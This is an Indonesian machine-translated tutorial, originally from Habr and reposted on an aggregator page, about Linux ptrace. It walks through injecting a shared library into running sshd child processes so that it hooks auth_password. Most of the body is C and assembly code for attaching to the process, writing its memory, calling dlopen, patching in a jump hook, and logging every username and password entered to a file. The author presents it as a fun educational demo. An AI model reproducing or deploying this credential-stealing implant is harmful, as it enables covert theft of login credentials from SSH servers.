<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👨🏽‍🌾 👩🏻‍🤝‍👨🏽 👩🏼‍🏫 Pengantar ptrace atau injeksi kode dalam sshd untuk bersenang-senang 📠 👩🏻 🏰</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Tujuan yang saya tetapkan sangat sederhana: untuk mempelajari kata sandi yang dimasukkan ke sshd menggunakan ptrace. Tentu saja, ini adalah tugas yang...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Pengantar ptrace atau injeksi kode dalam sshd untuk bersenang-senang</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/430302/"><img src="https://habrastorage.org/webt/ep/w1/el/epw1elpz3alvv_6vifmtdbazam0.png"><br><br>  Tujuan yang saya tetapkan sangat sederhana: untuk mempelajari kata sandi yang dimasukkan ke sshd menggunakan ptrace.  Tentu saja, ini adalah tugas yang agak artifisial, karena ada banyak cara lain, lebih efektif, untuk mencapai apa yang Anda inginkan (dan dengan probabilitas yang jauh lebih rendah untuk mendapatkan <abbr title="Kesalahan segmentasi">SEGV</abbr> ), namun, sepertinya keren bagi saya untuk melakukan hal itu. <br><a name="habracut"></a><br><h1>  Apa itu ptrace? </h1><br>  Mereka yang akrab dengan suntikan Windows mungkin akan tahu fungsi-fungsi <code>VirtualAllocEx()</code> , <code>WriteProcessMemory()</code> , <code>ReadProcessMemory()</code> dan <code>CreateRemoteThread()</code> .  Panggilan ini memungkinkan Anda untuk mengalokasikan memori dan memulai utas dalam proses lain.  Di dunia linux, kernel memberi kita <code>ptrace</code> , terima kasih kepada para debugger yang dapat berinteraksi dengan proses yang sedang berjalan. <br><br>  Ptrace menawarkan beberapa operasi debug yang berguna, misalnya: <br><br><ul><li>  PTRACE_ATTACH - memungkinkan Anda untuk bergabung dengan satu proses dengan menjeda proses yang di-debug </li><li>  PTRACE_PEEKTEXT - memungkinkan Anda membaca data dari ruang alamat proses lain </li><li>  PTRACE_POKETEXT - memungkinkan Anda untuk menulis data ke ruang alamat proses lain </li><li>  PTRACE_GETREGS - Membaca status register proses saat ini </li><li>  PTRACE_SETREGS - mencatat status register proses </li><li>  PTRACE_CONT - melanjutkan eksekusi dari proses yang di-debug </li></ul><br>  Meskipun ini bukan daftar lengkap fitur ptrace, namun, saya mengalami kesulitan karena kurangnya fungsi yang saya kenal dari Win32.  Misalnya, pada Windows, Anda dapat mengalokasikan memori dalam proses lain menggunakan fungsi <code>VirtualAllocEx()</code> , yang mengembalikan pointer ke memori yang baru dialokasikan.  Karena ini tidak ada di ptrace, Anda harus berimprovisasi jika Anda ingin menanamkan kode Anda dalam proses lain. <br><br>  Kalau begitu, mari kita pikirkan tentang bagaimana mengendalikan proses menggunakan ptrace. <br><br><h1>  Dasar-dasar ptrace </h1><br>  Hal pertama yang harus kita lakukan adalah bergabung dengan proses yang menarik bagi kita.  Untuk melakukan ini, panggil saja ptrace dengan parameter PTRACE_ATTACH: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_ATTACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Panggilan ini sederhana sebagai kemacetan lalu lintas, ia menerima PID dari proses yang ingin Anda ikuti.  Ketika panggilan terjadi, sinyal SIGSTOP dikirim, yang memaksa proses menarik dihentikan. <br><br>  Setelah bergabung, ada alasan untuk menyimpan status semua register sebelum kita mulai mengubah sesuatu.  Ini akan memungkinkan kami untuk mengembalikan program nanti: <br><br><pre> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oldregs</span></span></span><span class="hljs-class">;</span></span> ptrace(PTRACE_GETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;oldregs);</code> </pre><br>  Selanjutnya, Anda perlu menemukan tempat di mana kami dapat menulis kode kami.  Cara termudah adalah mengekstraksi informasi dari file peta, yang dapat ditemukan di procfs untuk setiap proses.  Misalnya, "/ proc / PID / maps" pada proses sshd yang berjalan di Ubuntu terlihat seperti ini: <br><br><img src="https://habrastorage.org/webt/me/_2/ug/me_2ugeh7hugdyuqx_xfkp-myuy.png"><br><br>  Kita perlu menemukan area memori yang dialokasikan dengan hak untuk mengeksekusi (kemungkinan besar "r-xp").  Segera setelah kami menemukan area yang sesuai dengan kami, dengan analogi dengan register, kami menyimpan konten, sehingga nanti kami dapat mengembalikan pekerjaan dengan benar: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_PEEKTEXT, pid, addr, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Dengan menggunakan ptrace, Anda dapat membaca satu kata data mesin (32 bit pada x86 atau 64 bit pada x86_64) di alamat yang ditentukan, yaitu, untuk membaca lebih banyak data, Anda perlu melakukan beberapa panggilan, menambah alamat. <br><br>  <i>Catatan: di linux, ada juga process_vm_readv () dan process_vm_writev () untuk bekerja dengan ruang alamat dari proses lain.</i>  <i>Namun, dalam artikel ini saya akan tetap menggunakan ptrace.</i>  <i>Jika Anda ingin melakukan sesuatu yang berbeda, lebih baik membaca tentang fungsi-fungsi ini.</i> <br><br>  Sekarang kita telah mencadangkan area memori yang kita suka, kita dapat mulai menimpa: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  Seperti PTRACE_PEEKTEXT, panggilan ini hanya dapat merekam satu kata mesin pada satu waktu di alamat yang ditentukan.  Juga, menulis lebih dari satu kata mesin akan membutuhkan banyak panggilan. <br><br>  Setelah memuat kode Anda, Anda perlu mentransfer kontrol untuk itu.  Agar tidak menimpa data dalam memori (misalnya, tumpukan), kami akan menggunakan register yang disimpan sebelumnya: <br><br><pre> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">r</span></span></span><span class="hljs-class">;</span></span> <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;r, &amp;oldregs, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(struct user_regs_struct)); <span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our injected code regs.rip = addr_of_injected_code; ptrace(PTRACE_SETREGS, pid, NULL, &amp;r);</span></span></code> </pre><br>  Akhirnya, kami dapat melanjutkan eksekusi dengan PTRACE_CONT: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_CONT, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Tetapi bagaimana kita tahu bahwa kode kita sudah selesai dieksekusi?  Kami akan menggunakan interupsi perangkat lunak, juga dikenal sebagai instruksi "int 0x03" yang menghasilkan SIGTRAP.  Kami akan menunggu ini dengan waitpid (): <br><br><pre> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED);</code> </pre><br>  waitpid () - panggilan pemblokiran yang akan menunggu proses untuk berhenti dengan pengidentifikasi PID dan menulis alasan untuk berhenti ke variabel status.  Di sini, ngomong-ngomong, ada banyak makro yang membuat hidup lebih mudah dalam menemukan alasan untuk berhenti. <br><br>  Untuk mengetahui apakah ada penghentian karena SIGTRAP (karena memanggil int 0x03), kita dapat melakukan ini: <br><br><pre> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (WIFSTOPPED(status) &amp;&amp; WSTOPSIG(status) == SIGTRAP) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"SIGTRAP received\n"</span></span>); }</code> </pre><br>  Pada titik ini, kode tertanam kami telah dieksekusi dan yang perlu kita lakukan hanyalah mengembalikan proses ke keadaan semula.  Pulihkan semua register: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_SETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;origregs);</code> </pre><br>  Kemudian kami akan mengembalikan data asli dalam memori: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  Dan putuskan sambungan dari proses: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_DETACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Itu teori yang cukup.  Mari kita beralih ke bagian yang lebih menarik. <br><br><h1>  Sshd injeksi </h1><br>  <i>Saya harus memperingatkan bahwa ada kemungkinan menjatuhkan sshd, jadi berhati-hatilah dan jangan mencoba untuk memeriksa ini pada sistem kerja dan terutama pada sistem jarak jauh melalui SSH: D</i> <i><br><br></i>  <i>Selain itu, ada beberapa cara yang lebih baik untuk mencapai hasil yang sama, saya menunjukkan ini hanya sebagai cara yang menyenangkan untuk menunjukkan kekuatan ptrace (setuju bahwa ini lebih baik daripada menyuntikkan ke Hello World;)</i> <br><br>  Satu-satunya hal yang ingin saya lakukan adalah mendapatkan kombinasi login-password dari menjalankan sshd ketika pengguna diautentikasi.  Saat melihat kode sumber, kita dapat melihat sesuatu seperti ini: <br><br>  <a href="">auth-passwd.c</a> <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">/* * Tries to authenticate the user using password. Returns true if * authentication succeeds. */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">auth_password</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Authctxt *authctxt, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *password)</span></span></span><span class="hljs-function"> </span></span>{ ... }</code> </pre><br>  Sepertinya tempat yang tepat untuk mencoba menghapus nama pengguna / kata sandi yang dikirimkan oleh pengguna dalam bentuk teks. <br><br>  Kami ingin menemukan tanda tangan fungsi yang memungkinkan kami menemukan [fungsinya] di memori.  Saya menggunakan utilitas pembongkaran favorit saya, radare2: <br><br><img src="https://habrastorage.org/webt/4r/xx/z_/4rxxz_4bv-g5uoo3fiqsxueeefo.png"><br><br>  Penting untuk menemukan urutan byte yang unik dan hanya terjadi pada fungsi auth_password.  Untuk melakukan ini, kami akan menggunakan pencarian di radare2: <br><br><img src="https://habrastorage.org/webt/aq/ie/qt/aqieqttr95rwwklbsvyiwnh86no.png"><br><br>  Kebetulan urutan <code>xor rdx, rdx; cmp rax, 0x400</code>  <code>xor rdx, rdx; cmp rax, 0x400</code> sesuai dengan persyaratan kami dan hanya ditemukan sekali di seluruh file ELF. <br><br>  Sebagai catatan ... Jika Anda tidak memiliki urutan ini, pastikan bahwa Anda memiliki versi terbaru, yang juga <a href="">menutup</a> kerentanan pertengahan 2016. (Dalam versi 7.6, urutan ini juga unik - sekitar Per.) <br><br>  Langkah selanjutnya adalah injeksi kode. <br><br><h1>  Unduh .so ke sshd </h1><br>  Untuk memuat kode kami ke sshd, kami akan membuat rintisan kecil yang memungkinkan kami memanggil dlopen () dan memuat pustaka dinamis yang sudah menerapkan substitusi "auth_password". <br><br>  dlopen () adalah panggilan untuk penautan dinamis, yang mengambil jalur ke perpustakaan dinamis dalam argumen dan memuatnya ke ruang alamat dari proses panggilan.  Fungsi ini terletak di libdl.so, yang secara dinamis menghubungkan ke aplikasi. <br><br>  Untungnya, dalam kasus kami, libdl.so sudah dimuat ke sshd, jadi kami hanya perlu menjalankan dlopen ().  Namun, karena <abbr title="Pengacakan tata letak ruang alamat">ASLR,</abbr> sangat kecil kemungkinan dlopen () akan berada di tempat yang sama setiap waktu, jadi Anda harus menemukan alamatnya dalam memori sshd. <br><br>  Untuk menemukan alamat fungsi, Anda perlu menghitung offset - perbedaan antara alamat fungsi dlopen () dan alamat awal libdl.so: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> libdlAddr, dlopenAddr; libdlAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlopen(<span class="hljs-string"><span class="hljs-string">"libdl.so"</span></span>, RTLD_LAZY); dlopenAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlsym(libdlAddr, <span class="hljs-string"><span class="hljs-string">"dlopen"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"Offset: %llx\n"</span></span>, dlopenAddr - libdlAddr);</code> </pre><br>  Sekarang kita telah menghitung offset, kita perlu menemukan alamat awal libdl.so dari file maps: <br><br><img src="https://habrastorage.org/webt/pm/vu/ja/pmvuja0gax1gdlqv48bwpeiadu0.png"><br><br>  Mengetahui alamat dasar libdl.so di sshd (0x7f0490a0d000, sebagai berikut dari tangkapan layar di atas), kita dapat menambahkan offset dan mendapatkan alamat dlopen () untuk menelepon dari kode injeksi. <br><br>  Kami akan melewati semua alamat yang diperlukan melalui register menggunakan PTRACE_SETREGS. <br><br>  Kita juga perlu menulis path ke pustaka yang diimplan ke dalam ruang alamat sshd, misalnya: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ptraceWrite</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> pid, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> addr, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *data, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> len)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> word = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; len; i+=<span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word), word=<span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;word, data + i, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ptrace(PTRACE_POKETEXT, pid, addr + i, word)) == <span class="hljs-number"><span class="hljs-number">-1</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"[!] Error writing process memory\n"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>); } } } ptraceWrite(pid, (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)freeaddr, <span class="hljs-string"><span class="hljs-string">"/tmp/inject.so\x00"</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)</code> </pre><br>  Dengan melakukan sebanyak mungkin selama persiapan injeksi dan memuat pointer ke argumen langsung ke register, kita dapat membuat kode injeksi lebih mudah.  Sebagai contoh: <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our code, which will be just after // our injected library name string regs.rip = (unsigned long long)freeaddr + DLOPEN_STRING_LEN + NOP_SLED_LEN; // Update RAX to point to dlopen() regs.rax = (unsigned long long)dlopenAddr; // Update RDI to point to our library name string regs.rdi = (unsigned long long)freeaddr; // Set RSI as RTLD_LAZY for the dlopen call regs.rsi = 2; // RTLD_LAZY // Update the target process registers ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs);</span></span></code> </pre><br>  Artinya, injeksi kode cukup sederhana: <br><br><pre> <code class="cpp hljs">; RSI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as value <span class="hljs-string"><span class="hljs-string">'2'</span></span> (RTLD_LAZY) ; RDI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as <span class="hljs-keyword"><span class="hljs-keyword">char</span></span>* to shared library path ; RAX contains the address of dlopen call rax <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> <span class="hljs-number"><span class="hljs-number">0x03</span></span></code> </pre><br>  Saatnya membuat perpustakaan dinamis kami, yang akan dimuat dengan kode injeksi. <br><br>  Sebelum kita melanjutkan, pertimbangkan satu hal penting yang akan digunakan ... Konstruktor perpustakaan dinamis. <br><br><h1>  Konstruktor dalam perpustakaan dinamis </h1><br>  Perpustakaan dinamis dapat mengeksekusi kode saat memuat.  Untuk melakukan ini, tandai fungsi dengan decoder "__attribute __ ((constructor))".  Sebagai contoh: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; void __attribute__((constructor)) test(void) { printf("Library loaded on dlopen()\n"); }</span></span></span></span></code> </pre> <br>  Anda dapat menyalin menggunakan perintah sederhana: <br><br><pre> <code class="bash hljs">gcc -o test.so --shared -fPIC test.c</code> </pre><br>  Dan kemudian periksa kinerjanya: <br><br><pre> <code class="cpp hljs">dlopen(<span class="hljs-string"><span class="hljs-string">"./test.so"</span></span>, RTLD_LAZY);</code> </pre><br>  Ketika perpustakaan memuat, konstruktor juga akan dipanggil: <br><br><img src="https://habrastorage.org/webt/c1/ez/ao/c1ezaodwm4j0tk8mmqmhwhjbl5i.png"><br><br>  Kami juga menggunakan fungsi ini untuk membuat hidup kita lebih mudah ketika menyuntikkan kode ke ruang alamat dari proses lain. <br><br><h1>  Sshd dynamic library </h1><br>  Sekarang kita memiliki kesempatan untuk memuat pustaka dinamis kita, kita perlu membuat kode yang akan mengubah perilaku auth_password () saat runtime. <br><br>  Ketika pustaka dinamis kita dimuat, kita dapat menemukan alamat awal sshd menggunakan file "/ proc / self / maps" di procfs.  Kami mencari area dengan izin "rx" di mana kami akan mencari urutan unik di auth_password (): <br><br><pre> <code class="cpp hljs">d = fopen(<span class="hljs-string"><span class="hljs-string">"/proc/self/maps"</span></span>, <span class="hljs-string"><span class="hljs-string">"r"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(fgets(buffer, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(buffer), fd)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"/sshd"</span></span>) &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"rx"</span></span>)) { ptr = strtoull(buffer, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); end = strtoull(<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"-"</span></span>)+<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre><br>  Karena kami memiliki berbagai alamat untuk dicari, kami mencari fungsi: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *search = <span class="hljs-string"><span class="hljs-string">"\x31\xd2\x48\x3d\x00\x04\x00\x00"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(ptr &lt; end) { <span class="hljs-comment"><span class="hljs-comment">// ptr[0] == search[0] added to increase performance during searching // no point calling memcmp if the first byte doesn't match our signature. if (ptr[0] == search[0] &amp;&amp; memcmp(ptr, search, 9) == 0) { break; } ptr++; }</span></span></code> </pre><br>  Ketika kami menemukan kecocokan, Anda harus menggunakan mprotect () untuk mengubah izin di area memori.  Ini semua karena area memori dapat dibaca dan dieksekusi, dan izin menulis diperlukan untuk perubahan saat bepergian: <br><br><pre> <code class="cpp hljs">mprotect((<span class="hljs-keyword"><span class="hljs-keyword">void</span></span>*)(((<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)ptr / <span class="hljs-number"><span class="hljs-number">4096</span></span>) * <span class="hljs-number"><span class="hljs-number">4096</span></span>), <span class="hljs-number"><span class="hljs-number">4096</span></span>*<span class="hljs-number"><span class="hljs-number">2</span></span>, PROT_READ | PROT_WRITE | PROT_EXEC)</code> </pre><br>  Nah, kami memiliki hak untuk menulis ke area memori yang diinginkan dan sekarang saatnya untuk menambahkan loncatan kecil di awal fungsi auth_password, yang akan memberikan kontrol ke hook: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">char</span></span> jmphook[] = <span class="hljs-string"><span class="hljs-string">"\x48\xb8\x48\x47\x46\x45\x44\x43\x42\x41\xff\xe0"</span></span>;</code> </pre><br>  Ini sama dengan kode ini: <br><br><pre> <code class="cpp hljs">mov rax, <span class="hljs-number"><span class="hljs-number">0x4142434445464748</span></span> jmp rax</code> </pre> <br>  Tentu saja, alamat 0x4142434445464748 tidak cocok untuk kami dan akan diganti dengan alamat hook kami: <br><br><pre> <code class="cpp hljs">*(<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> *)((<span class="hljs-keyword"><span class="hljs-keyword">char</span></span>*)jmphook+<span class="hljs-number"><span class="hljs-number">2</span></span>) = &amp;passwd_hook;</code> </pre> <br>  Sekarang kita bisa memasukkan loncatan kita ke sshd.  Untuk membuat injeksi indah dan bersih, masukkan loncatan di awal fungsi: <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Step back to the start of the function, which is 32 bytes // before our signature ptr -= 32; memcpy(ptr, jmphook, sizeof(jmphook));</span></span></code> </pre><br>  Sekarang kita harus mengimplementasikan hook yang akan menangani logging data yang lewat.  Kami harus yakin bahwa kami telah menyimpan semua register sebelum dimulainya hook dan dikembalikan sebelum kembali ke kode asli: <br><br><div class="spoiler">  <b class="spoiler_title">Kode sumber kait</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Remember the prolog: push rbp; mov rbp, rsp; // that takes place when entering this function void passwd_hook(void *arg1, char *password) { // We want to store our registers for later asm("push %rsi\n" "push %rdi\n" "push %rax\n" "push %rbx\n" "push %rcx\n" "push %rdx\n" "push %r8\n" "push %r9\n" "push %r10\n" "push %r11\n" "push %r12\n" "push %rbp\n" "push %rsp\n" ); // Our code here, is used to store the username and password char buffer[1024]; int log = open(PASSWORD_LOCATION, O_CREAT | O_RDWR | O_APPEND); // Note: The magic offset of "arg1 + 32" contains a pointer to // the username from the passed argument. snprintf(buffer, sizeof(buffer), "Password entered: [%s] %s\n", *(void **)(arg1 + 32), password); write(log, buffer, strlen(buffer)); close(log); asm("pop %rsp\n" "pop %rbp\n" "pop %r12\n" "pop %r11\n" "pop %r10\n" "pop %r9\n" "pop %r8\n" "pop %rdx\n" "pop %rcx\n" "pop %rbx\n" "pop %rax\n" "pop %rdi\n" "pop %rsi\n" ); // Recover from the function prologue asm("mov %rbp, %rsp\n" "pop %rbp\n" ); ...</span></span></code> </pre><br></div></div><br>  Yah, itu saja ... dengan cara ... <br><br>  Sayangnya, setelah semua yang telah dilakukan, ini belum semuanya.  Bahkan jika injeksi kode sshd gagal, Anda mungkin memperhatikan bahwa kata sandi pengguna yang Anda cari masih belum tersedia.  Ini disebabkan oleh fakta bahwa sshd untuk setiap koneksi menciptakan anak baru.  Adalah anak baru yang memproses koneksi dan di dalam dia kitalah yang harus mengatur. <br><br>  Untuk memastikan bahwa kami bekerja dengan anak-anak sshd, saya memutuskan untuk memindai procfs untuk file statistik yang menentukan Parent PID sshd.  Segera setelah proses tersebut ditemukan, injektor mulai untuknya. <br><br>  Bahkan ada keuntungannya.  Jika semuanya berjalan salah dan injeksi kode turun dari SIGSEGV, hanya proses satu pengguna yang akan dimatikan, dan bukan proses sshd induk.  Bukan penghiburan terbesar, tapi itu jelas membuat proses debug lebih mudah. <br><br><h1>  Injeksi dalam aksi </h1><br>  Ok, mari kita lihat demo: <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><img src="https://asciinema.org/a/5i0dcmskkdwomlv6su2sxx07v.svg"></a> <br><br>  Kode lengkap dapat ditemukan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br><br>  Saya berharap perjalanan ini telah memberi Anda informasi yang cukup untuk menyodok ptrace sendiri. <br><br>  Saya ingin berterima kasih kepada orang-orang dan situs berikut yang membantu menangani ptrace: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Toolkit injeksi perpustakaan dinamis Gaffe23</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Pekerjaan Injeksi EvilSocket Hebat</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id430302/">https://habr.com/ru/post/id430302/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id430290/index.html">Upaya untuk memprediksi iterasi keempat dari proyek SpaceX BFR</a></li>
<li><a href="../id430292/index.html">Electronic Frontier Foundation: Kinerja jaringan plat polisi AS 0,5%</a></li>
